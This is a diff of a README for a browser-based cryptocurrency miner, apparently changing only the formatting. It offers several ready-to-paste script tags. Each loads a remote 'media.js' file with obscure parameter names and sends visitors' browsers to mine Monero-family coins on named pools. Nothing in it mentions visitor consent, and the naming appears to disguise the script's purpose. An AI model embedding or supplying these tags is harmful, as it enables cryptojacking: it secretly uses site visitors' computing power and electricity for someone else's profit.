@@ -4,27 +4,28 @@ Crypto Webminer | Electroneum | Monero | Bytecoin | IntenseCoin | Graft | Sumoko
 Attention: IPBC created their own PoW variant....so mining is disabled for the moment<br>
 <br>
 
-Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
+#### Simple Pool change: ?jason=Your_Favorite_Pool:PortNr
 
-Complete example:
+#### Complete example:
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=0?jason=pool.supportxmr.com:3333" > </script>
 ```
-Attention: Special Case for some custom variant fork coins: Intensecoin need ?algo=cn?variant=1<br> 
+#### Attention: Special Case for some custom variant fork coins: Intensecoin need ?algo=cn?variant=1<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=pool.intensecoin.com:3333" > </script>
 ```
-Attention: Special Case for some custom POW coins: Masari need ?algo=cn/msr?variant=1<br> 
+#### Attention: Special Case for some custom POW coins: Masari need ?algo=cn/msr?variant=1<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/msr?variant=1?jason=masari.ingest.cryptoknight.cc:3333" > </script>
 ```
-Attention: Special Case for some custom POW coins: Stellite need ?algo=cn/xtl?variant=2<br> 
+#### Attention: Special Case for some custom POW coins: Stellite need ?algo=cn/xtl?variant=2<br> 
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn/xtl?variant=2?jason=communitypool.stellite.cash:6677" > </script>
 ```
-Attention: Special Case for some custom cn-lite variant fork coins: Aeon, Turtlecoin Ultranote need ?algo=cn-lite?variant=1
+#### Attention: Special Case for some custom cn-lite variant fork coins: Aeon, Turtlecoin Ultranote need ?algo=cn-lite?variant=1
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=1?jason=mine.supportaeon.com:3333" > </script>
+```
 ```sh
 <script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555" > </script>
 ```
